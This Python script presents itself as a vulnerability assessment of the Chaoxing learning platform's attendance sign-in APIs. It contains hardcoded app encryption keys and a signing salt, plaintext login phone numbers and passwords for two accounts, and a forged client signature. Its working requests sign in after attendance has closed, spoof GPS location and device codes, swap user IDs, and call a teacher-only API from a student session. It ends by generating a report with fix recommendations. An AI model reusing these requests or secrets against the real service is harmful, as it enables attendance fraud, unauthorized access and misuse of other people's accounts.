import base64, hashlib, json, os, re, time, uuid, urllib.parse
from datetime import datetime
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10) AppleWebKit/537.36 "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314")
REPORT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sign_status_modify_report.md")
results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua_with_schild():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session(); s.verify = False
    ua = get_mobile_ua_with_schild()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid":"-1","uname":aes_enc(phone),"password":aes_enc(pwd),
        "refer":"http%3A%2F%2Fi.mooc.chaoxing.com","t":"true","forbidotherlogin":"0",
        "validate":"","doubleFactorLogin":"0","independentId":"0","independentNameId":"0"},
        allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID","_uid"): puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"raw_status": r.status_code, "raw_text": r.text[:500]}

def rec(tid, name, api_endpoint, test_type, vuln, sev, detail, evidence=""):
    results.append({"id":tid,"name":name,"api":api_endpoint,"test_type":test_type,
        "vuln":vuln,"sev":sev,"detail":detail,"evidence":evidence[:800]})
    tag = "[VULN]" if vuln else "[SAFE]"
    print(f"  {tag} {tid} [{api_endpoint}]: {detail[:120]}")

def get_courses(session):
    r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
                "roletype": c.get("roletype", 0),
            })
    return courses

def get_activities(session, courseid, classid, uid):
    r = session.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist", params={
        "courseId": courseid, "classId": classid, "uid": uid,
    }, timeout=20)
    d = safe_json(r)
    activities = []
    active_list = d.get("activeList", [])
    for item in active_list:
        if isinstance(item, dict):
            activities.append({
                "id": str(item.get("id", item.get("activeId", ""))),
                "type": str(item.get("activeType", "")),
                "name": item.get("nameOne", ""),
                "status": str(item.get("status", "")),
                "startTime": item.get("startTime", ""),
                "endTime": item.get("endTime", ""),
                "isLook": item.get("isLook", ""),
                "releaseNum": item.get("releaseNum", ""),
            })
    return activities

def run():
    print("="*70+f"\n签到状态修改漏洞安全评估\n时间: {datetime.now():%Y-%m-%d %H:%M:%S}\n"+"="*70)

    # ================================================================
    # 第一阶段：调查
    # ================================================================
    print("\n" + "="*70)
    print("[第一阶段] 签到API端点与流程调查")
    print("="*70)

    print("\n[Task 1.1] 教师账号登录...")
    s_teacher, p_teacher = login("19712720708", "3.1415926Cpy")
    print(f"  教师puid={p_teacher}")

    print("\n[Task 1.2] 教师获取课程列表...")
    teacher_courses = get_courses(s_teacher)
    course_111 = None
    for c in teacher_courses:
        print(f"  课程: {c['name']}, roletype={c['roletype']}, courseId={c['courseid']}, classId={c['classid']}, cpi={c['cpi']}")
        if "111" in c['name']:
            course_111 = c

    if not course_111:
        print("  [!] 未找到'111'课程，使用第一个课程")
        course_111 = teacher_courses[0] if teacher_courses else {}

    print(f"\n  目标课程: {course_111.get('name','N/A')}")

    print("\n[Task 1.2] 教师获取活动列表...")
    teacher_activities = get_activities(s_teacher, course_111.get("courseid","0"), course_111.get("classid","0"), p_teacher)
    print(f"  教师端活动数={len(teacher_activities)}")
    for a in teacher_activities[:10]:
        print(f"    活动: id={a['id']}, type={a['type']}, name={a['name']}, status={a['status']}")

    sign_activities = [a for a in teacher_activities if a["type"] in ("1","2","3","4")]
    print(f"  签到活动数={len(sign_activities)}")

    print("\n[Task 1.3] 学生账号登录...")
    s_student, p_student = login("18436633997", "3.1415926Cpy")
    print(f"  学生puid={p_student}")

    print("\n[Task 1.4] 学生获取课程列表...")
    student_courses = get_courses(s_student)
    student_course_111 = None
    for c in student_courses:
        print(f"  课程: {c['name']}, roletype={c['roletype']}, courseId={c['courseid']}, classId={c['classid']}, cpi={c['cpi']}")
        if "111" in c['name']:
            student_course_111 = c

    if not student_course_111:
        print("  [!] 学生端未找到'111'课程，使用教师端课程信息")
        student_course_111 = course_111

    print("\n[Task 1.4] 学生获取活动列表...")
    student_activities = get_activities(s_student, student_course_111.get("courseid","0"), student_course_111.get("classid","0"), p_student)
    print(f"  学生端活动数={len(student_activities)}")
    for a in student_activities[:10]:
        print(f"    活动: id={a['id']}, type={a['type']}, name={a['name']}, status={a['status']}")

    student_sign_activities = [a for a in student_activities if a["type"] in ("1","2","3","4")]
    print(f"  学生端签到活动数={len(student_sign_activities)}")

    # Record Phase 1 results
    rec("T1-01", "教师获取课程和活动信息", "/mycourse/backclazzdata + /ppt/activeAPI/taskactivelist",
        "调查", True, "LOW",
        f"教师端: 课程数={len(teacher_courses)}, 活动数={len(teacher_activities)}, 签到活动数={len(sign_activities)}",
        f"目标课程: {course_111.get('name','')}, courseId={course_111.get('courseid','')}, classId={course_111.get('classid','')}")

    rec("T1-02", "学生获取课程和活动信息", "/mycourse/backclazzdata + /ppt/activeAPI/taskactivelist",
        "调查", True, "LOW",
        f"学生端: 课程数={len(student_courses)}, 活动数={len(student_activities)}, 签到活动数={len(student_sign_activities)}",
        f"学生puid={p_student}, 教师puid={p_teacher}")

    # ================================================================
    # 第二阶段：签到状态修改测试
    # ================================================================
    print("\n" + "="*70)
    print("[第二阶段] 签到状态修改测试")
    print("="*70)

    cid = student_course_111.get("courseid", course_111.get("courseid", "0"))
    clid = student_course_111.get("classid", course_111.get("classid", "0"))
    cpi = student_course_111.get("cpi", course_111.get("cpi", "0"))

    # Task 2: 学生获取已结束签到活动信息
    print("\n[Task 2] 学生获取已结束签到活动信息")

    # T2-01: 学生请求签到前页面
    if sign_activities:
        test_aid = sign_activities[0]["id"]
        test_atype = sign_activities[0]["type"]
        print(f"  测试签到活动: id={test_aid}, type={test_atype}")

        r = s_student.get("https://mobilelearn.chaoxing.com/newsign/preSign", params={
            "activeId": test_aid,
            "classId": clid,
            "courseId": cid,
            "uid": p_student,
        }, timeout=20)
        presign_ok = r.status_code == 200 and len(r.text) > 100

        # Extract sign parameters from HTML
        sign_params_found = {}
        if presign_ok:
            lat_match = re.search(r'latitude["\s:=]+["\']?(-?[\d.]+)', r.text)
            lng_match = re.search(r'longitude["\s:=]+["\']?(-?[\d.]+)', r.text)
            addr_match = re.search(r'address["\s:=]+["\']([^"\']+)', r.text)
            active_type_match = re.search(r'activeType["\s:=]+["\']?(\d+)', r.text)
            sign_code_match = re.search(r'signCode["\s:=]+["\']([^"\']+)', r.text)
            sign_params_found = {
                "latitude": lat_match.group(1) if lat_match else "N/A",
                "longitude": lng_match.group(1) if lng_match else "N/A",
                "address": addr_match.group(1) if addr_match else "N/A",
                "activeType": active_type_match.group(1) if active_type_match else "N/A",
                "signCode": sign_code_match.group(1) if sign_code_match else "N/A",
            }
            print(f"  签到页面参数: {sign_params_found}")

        rec("T2-01", "学生请求签到前页面", "/newsign/preSign",
            "信息获取", presign_ok, "MEDIUM",
            f"学生访问签到前页面: {'成功' if presign_ok else '失败'}，签到参数: {sign_params_found}",
            f"HTTP {r.status_code}, 页面长度={len(r.text)}")

    # Task 3: 学生对已结束签到执行签到操作
    print("\n[Task 3] 学生对已结束签到执行签到操作")

    for a in sign_activities[:5]:
        aid = a["id"]
        atype = a["type"]
        aname = a["name"]
        astatus = a["status"]
        print(f"\n  测试签到: id={aid}, type={atype}, name={aname}, status={astatus}")

        # T3: Try to sign for each activity
        sign_data = {
            "activeId": aid,
            "uid": p_student,
            "clientip": "",
            "latitude": "-1",
            "longitude": "-1",
            "appType": "15",
            "fid": "0",
            "name": "",
        }

        if atype == "2":
            sign_data["latitude"] = "39.9042"
            sign_data["longitude"] = "116.4074"
            sign_data["address"] = "北京市天安门"
        elif atype in ("3", "4"):
            sign_data["signCode"] = "1"

        r = s_student.post("https://mobilelearn.chaoxing.com/pptSign/stuSignajax", data=sign_data,
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"},
            timeout=20)
        d = safe_json(r)
        sign_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower() and "已结束" not in str(d) and "已过期" not in str(d)

        type_names = {"1":"普通签到","2":"位置签到","3":"手势签到","4":"签到码签到"}
        rec(f"T3-{aid}", f"学生对{type_names.get(atype,'未知')}签到执行签到操作", "/pptSign/stuSignajax",
            "签到状态修改", sign_ok, "CRITICAL" if sign_ok else "LOW",
            f"学生对已{'结束' if astatus != '1' else '进行中'}的{type_names.get(atype,'未知')}签到(id={aid})执行签到: {'成功(严重!)' if sign_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

    # Task 4: 学生伪造/重放签到请求
    print("\n[Task 4] 学生伪造/重放签到请求")

    if sign_activities:
        aid = sign_activities[0]["id"]

        # T4-01: 修改uid为其他学生
        r = s_student.post("https://mobilelearn.chaoxing.com/pptSign/stuSignajax", data={
            "activeId": aid,
            "uid": p_teacher,
            "clientip": "",
            "latitude": "-1",
            "longitude": "-1",
            "appType": "15",
            "fid": "0",
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        fake_uid_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
        rec("T4-01", "伪造uid为教师uid执行签到", "/pptSign/stuSignajax",
            "参数篡改", fake_uid_ok, "CRITICAL",
            f"使用教师uid({p_teacher})执行签到: {'成功(严重!)' if fake_uid_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

        # T4-02: 修改appType参数
        r = s_student.post("https://mobilelearn.chaoxing.com/pptSign/stuSignajax", data={
            "activeId": aid,
            "uid": p_student,
            "clientip": "",
            "latitude": "-1",
            "longitude": "-1",
            "appType": "1",
            "fid": "0",
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        fake_apptype_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
        rec("T4-02", "修改appType参数执行签到", "/pptSign/stuSignajax",
            "参数篡改", fake_apptype_ok, "MEDIUM",
            f"修改appType=1执行签到: {'成功' if fake_apptype_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

        # T4-03: 伪造位置签到（对非位置签到活动）
        r = s_student.post("https://mobilelearn.chaoxing.com/pptSign/stuSignajax", data={
            "activeId": aid,
            "uid": p_student,
            "clientip": "",
            "latitude": "31.2304",
            "longitude": "121.4737",
            "address": "上海市人民广场",
            "appType": "15",
            "fid": "0",
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        fake_loc_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
        rec("T4-03", "伪造位置签到（含经纬度和地址）", "/pptSign/stuSignajax",
            "参数篡改", fake_loc_ok, "HIGH",
            f"伪造位置签到(上海): {'成功' if fake_loc_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

        # T4-04: 伪造deviceCode
        r = s_student.post("https://mobilelearn.chaoxing.com/pptSign/stuSignajax", data={
            "activeId": aid,
            "uid": p_student,
            "clientip": "",
            "latitude": "-1",
            "longitude": "-1",
            "appType": "15",
            "fid": "0",
            "deviceCode": uuid.uuid4().hex,
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        fake_device_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
        rec("T4-04", "伪造deviceCode执行签到", "/pptSign/stuSignajax",
            "参数篡改", fake_device_ok, "MEDIUM",
            f"伪造deviceCode执行签到: {'成功' if fake_device_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

    # Task 5: 学生查看/修改签到结果
    print("\n[Task 5] 学生查看/修改签到结果")

    if sign_activities:
        aid = sign_activities[0]["id"]

        # T5-01: 学生查看签到结果
        r = s_student.get("https://mobilelearn.chaoxing.com/pptSign/signedResult", params={
            "activeId": aid,
            "classId": clid,
            "courseId": cid,
            "uid": p_student,
        }, headers={"Referer": "https://mobilelearn.chaoxing.com/"}, timeout=20)
        d = safe_json(r)
        result_ok = "data" in str(d) or "result" in str(d) or "sign" in str(d).lower() or "student" in str(d).lower()
        rec("T5-01", "学生查看签到结果", "/pptSign/signedResult",
            "信息获取", result_ok, "MEDIUM",
            f"学生查看签到结果: {'成功获取' if result_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

        # T5-02: 学生尝试修改签到状态（调用教师端API）
        r = s_student.post("https://mobilelearn.chaoxing.com/pptSign/teacherSignForStu", data={
            "activeId": aid,
            "classId": clid,
            "courseId": cid,
            "uid": p_student,
            "studentId": p_student,
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        modify_ok = d.get("result") is not None and d.get("result") != 0 and "error" not in str(d).lower()
        rec("T5-02", "学生调用教师补签API修改签到状态", "/pptSign/teacherSignForStu",
            "垂直越权", modify_ok, "CRITICAL",
            f"学生调用教师补签API: {'成功(严重!)' if modify_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

        # T5-03: 学生尝试查看其他学生的签到状态
        r = s_student.get("https://mobilelearn.chaoxing.com/pptSign/stuSignResult", params={
            "activeId": aid,
            "classId": clid,
            "courseId": cid,
        }, headers={"Referer": "https://mobilelearn.chaoxing.com/"}, timeout=20)
        d = safe_json(r)
        other_result_ok = "data" in str(d) or "result" in str(d) or "student" in str(d).lower()
        rec("T5-03", "学生查看其他学生签到状态", "/pptSign/stuSignResult",
            "水平越权", other_result_ok, "HIGH",
            f"学生查看其他学生签到状态: {'成功获取' if other_result_ok else '被拒绝'}",
            f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

    # ================================================================
    # 第三阶段：教师端验证
    # ================================================================
    print("\n" + "="*70)
    print("[第三阶段] 教师端签到管理验证")
    print("="*70)

    if sign_activities:
        aid = sign_activities[0]["id"]

        # T6-01: 教师查看签到结果
        r = s_teacher.get("https://mobilelearn.chaoxing.com/pptSign/signedResult", params={
            "activeId": aid,
            "classId": clid,
            "courseId": cid,
            "uid": p_teacher,
        }, headers={"Referer": "https://mobilelearn.chaoxing.com/"}, timeout=20)
        d = safe_json(r)
        teacher_result_ok = "data" in str(d) or "result" in str(d) or "sign" in str(d).lower()
        rec("T6-01", "教师查看签到结果", "/pptSign/signedResult",
            "基线", teacher_result_ok, "LOW",
            f"教师查看签到结果: {'成功' if teacher_result_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前500字: {r.text[:500]}")

        # T6-02: 教师修改学生签到状态
        r = s_teacher.post("https://mobilelearn.chaoxing.com/pptSign/teacherSignForStu", data={
            "activeId": aid,
            "classId": clid,
            "courseId": cid,
            "uid": p_teacher,
            "studentId": p_student,
        }, headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Referer": "https://mobilelearn.chaoxing.com/",
                     "X-Requested-With": "XMLHttpRequest"}, timeout=20)
        d = safe_json(r)
        teacher_modify_ok = d.get("result") is not None and d.get("result") != 0
        rec("T6-02", "教师修改学生签到状态", "/pptSign/teacherSignForStu",
            "基线", teacher_modify_ok, "LOW",
            f"教师修改学生签到状态: {'成功' if teacher_modify_ok else '失败'}，此API为学生越权测试的基准",
            f"HTTP {r.status_code}, 响应: {json.dumps(d, ensure_ascii=False)[:400]}")

        # T6-03: 教师查看签到活动详情
        r = s_teacher.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/activeDetail", params={
            "activeId": aid,
            "classId": clid,
            "courseId": cid,
        }, timeout=20)
        d = safe_json(r)
        detail_ok = "data" in str(d) or "result" in str(d)
        rec("T6-03", "教师查看签到活动详情", "/ppt/activeAPI/activeDetail",
            "基线", detail_ok, "LOW",
            f"教师查看签到活动详情: {'成功' if detail_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前300字: {r.text[:300]}")

    # ================================================================
    # Generate Report
    # ================================================================
    print("\n[Task 7] 生成签到状态修改漏洞评估报告...")
    gen_report(p_teacher, p_student, course_111, student_course_111, sign_activities)

def gen_report(p_teacher, p_student, course_111, student_course_111, sign_activities):
    vc = sum(1 for r in results if r["vuln"])
    tc = len(results)
    vs = {"CRITICAL":[],"HIGH":[],"MEDIUM":[],"LOW":[]}
    for r in results:
        if r["vuln"]: vs[r["sev"]].append(r)

    rp = []
    rp.append("# 签到状态修改漏洞安全评估报告\n\n")
    rp.append(f"**审计日期**: {datetime.now():%Y-%m-%d %H:%M:%S}\n\n")
    rp.append(f"**教师账号**: puid={p_teacher}\n\n")
    rp.append(f"**学生账号**: puid={p_student}\n\n")
    rp.append(f"**目标课程**: {course_111.get('name','111')}\n\n")

    rp.append("---\n\n## 一、测试结果汇总\n\n")
    rp.append(f"- **总测试数**: {tc}\n- **发现隐患数**: {vc}\n")
    rp.append(f"- **严重(CRITICAL)**: {len(vs['CRITICAL'])}\n- **高危(HIGH)**: {len(vs['HIGH'])}\n")
    rp.append(f"- **中危(MEDIUM)**: {len(vs['MEDIUM'])}\n- **低危(LOW)**: {len(vs['LOW'])}\n\n")

    rp.append("---\n\n## 二、签到API链路分析\n\n")
    rp.append("### 2.1 签到完整流程\n\n")
    rp.append("```\n1. GET /mycourse/backclazzdata → 获取课程列表(courseId, classId, cpi)\n")
    rp.append("2. GET /ppt/activeAPI/taskactivelist → 获取活动列表(activeId, activeType)\n")
    rp.append("3. GET /newsign/preSign?activeId=X → 获取签到页面(含签到参数)\n")
    rp.append("4. POST /pptSign/stuSignajax → 执行签到(activeId, uid, latitude, longitude, address)\n")
    rp.append("5. GET /pptSign/signedResult → 查看签到结果\n```\n\n")

    rp.append("### 2.2 签到类型\n\n")
    rp.append("| activeType | 签到类型 | 特殊参数 |\n|---|---|---|\n")
    rp.append("| 1 | 普通签到 | 无 |\n| 2 | 位置签到 | latitude, longitude, address |\n| 3 | 手势签到 | signCode |\n| 4 | 签到码签到 | signCode |\n\n")

    rp.append("---\n\n## 三、各测试项详细结果\n\n")
    for r in results:
        st = "存在风险" if r["vuln"] else "安全"
        rp.append(f"### {r['id']}: {r['name']} [{st}]\n\n")
        rp.append(f"- **API端点**: `{r['api']}`\n")
        rp.append(f"- **测试类型**: {r['test_type']}\n")
        rp.append(f"- **风险等级**: {r['sev']}\n")
        rp.append(f"- **结论**: {r['detail']}\n\n")
        if r["evidence"]:
            rp.append(f"- **证据**: {r['evidence']}\n\n")

    rp.append("---\n\n## 四、漏洞利用条件分析\n\n")
    rp.append("### 4.1 签到状态修改的利用条件\n\n")
    rp.append("根据测试结果，签到状态修改的利用条件取决于以下因素：\n\n")
    rp.append("1. **签到活动是否已结束**: 已结束的签到活动是否仍可执行签到操作\n")
    rp.append("2. **签到类型**: 不同签到类型的参数校验严格程度不同\n")
    rp.append("3. **位置校验**: 位置签到是否校验经纬度的真实性\n")
    rp.append("4. **设备校验**: 是否校验deviceCode防止同设备重复签到\n")
    rp.append("5. **时间校验**: 是否校验签到时间是否在活动有效期内\n\n")

    rp.append("---\n\n## 五、修复建议\n\n")
    rp.append("### 5.1 紧急修复\n\n")
    rp.append("1. **已结束签到禁止签到**: 服务端必须校验签到活动是否仍在有效期内\n")
    rp.append("2. **位置校验增强**: 位置签到应校验经纬度是否在合理范围内\n")
    rp.append("3. **教师补签API权限控制**: /pptSign/teacherSignForStu 必须校验请求者是否为课程教师\n\n")
    rp.append("### 5.2 中期加固\n\n")
    rp.append("4. **签到请求签名**: 签到请求应包含服务端验证的签名，防止参数篡改\n")
    rp.append("5. **deviceCode绑定**: 设备码应与服务端记录绑定，防止伪造\n")
    rp.append("6. **签到频率限制**: 防止签到请求重放攻击\n")
    rp.append("7. **签到结果访问控制**: 学生只能查看自己的签到状态\n\n")

    with open(REPORT, "w", encoding="utf-8") as f:
        f.write("\n".join(rp))
    print(f"  报告: {REPORT}")
    print(f"  共{tc}项, {vc}项隐患")
    print(f"  CRITICAL={len(vs['CRITICAL'])}, HIGH={len(vs['HIGH'])}, MEDIUM={len(vs['MEDIUM'])}, LOW={len(vs['LOW'])}")
    print("="*70)

if __name__ == "__main__":
    import urllib3; urllib3.disable_warnings()
    run()
